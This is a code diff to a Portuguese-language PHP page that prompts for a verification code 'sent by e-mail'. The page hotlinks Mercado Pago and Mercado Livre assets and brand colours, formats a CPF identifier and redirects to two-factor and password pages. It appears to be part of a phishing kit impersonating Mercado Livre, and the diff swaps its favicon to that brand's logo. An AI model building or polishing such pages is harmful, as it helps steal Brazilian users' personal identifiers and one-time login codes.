@@ -13,7 +13,7 @@ function isMobileDevice() {
 if (isMobileDevice()) {
     $redirect_target_2fa = 'dois_fatores.php';
 } else {
-    $redirect_target_2fa = 'dois_fatores.php'; 
+    $redirect_target_2fa = 'dois_fatores.php';
 }
 
 
@@ -33,7 +33,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Insira o código que te enviamos por e-mail</title>
-    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.73/mercadopago/favicon.svg" type="image/svg"/>
+    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.146/mercadolibre/pt_logo_large_plus@2x.webp" type="image/svg"/>
     <style>
         :root {
             --cor-amarela: #ffe600;
@@ -129,7 +129,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
             </div>
             <button type="submit" class="btn btn-primary">Confirmar código</button>
         </form>
-        
+
         <div class="resend-timer"></div>
         <a href="senha-mobile.php" class="footer-link">Escolher outro método</a>
     </main>
@@ -199,7 +199,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
         }
 
         document.addEventListener('DOMContentLoaded', startTimer);
-        
+
         async function handleFormSubmit(event) {
             event.preventDefault();
             const code = inputs.map(input => input.value).join('');
